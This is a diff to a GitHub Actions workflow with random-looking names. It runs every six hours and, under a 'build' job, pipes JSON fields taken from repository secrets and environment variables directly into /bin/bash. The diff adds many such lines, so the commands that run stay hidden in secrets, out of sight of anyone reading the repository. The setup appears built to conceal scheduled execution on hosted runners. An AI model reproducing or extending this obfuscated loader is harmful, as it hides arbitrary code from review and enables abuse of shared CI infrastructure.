@@ -1,22 +1,32 @@
 name: tangbuzhi5678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 0/6 * * *'
-jobs:  # 7295
+    - cron: '26 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tangbuzhi5678
         env:
-          qlhb90633: ${{ secrets.qlhb90633 }}
+          rhah2: ${{ secrets.rhah2 }}
         run: |
-          echo $qlhb90633 | jq -r .pq42 | /bin/bash
-          echo $pvrc8 | jq -r .saqkl75830 | /bin/bash
-          echo $hfex02 | jq -r .qiib560 | /bin/bash
-          echo $sff19 | jq -r .zwqna0 | /bin/bash
-          echo $peow71 | jq -r .vhpmw656 | /bin/bash
-          echo $xiitn39 | jq -r .bjml1170 | /bin/bash
+          echo $rhah2 | jq -r .h4266 | /bin/bash
+          echo $sxb7 | jq -r .oyjq554 | /bin/bash
+          echo $pyk69 | jq -r .z197 | /bin/bash
+          echo $qeqti318 | jq -r .w69 | /bin/bash
+          echo $eshua08223 | jq -r .qtti4842 | /bin/bash
+          echo $lp7 | jq -r .bf582 | /bin/bash
+          echo $ypoz2 | jq -r .zyh77479 | /bin/bash
+          echo $ewxej75557 | jq -r .q02860 | /bin/bash
+          echo $glqm561 | jq -r .i14660 | /bin/bash
+          echo $iieti6492 | jq -r .mz292 | /bin/bash
+          echo $xitmk9 | jq -r .rewo535 | /bin/bash
+          echo $u8438 | jq -r .phfty0094 | /bin/bash
+          echo $reuz7450 | jq -r .ldv208 | /bin/bash
+          echo $j465 | jq -r .ck2131 | /bin/bash
+          echo $fy4399 | jq -r .fz817 | /bin/bash
 
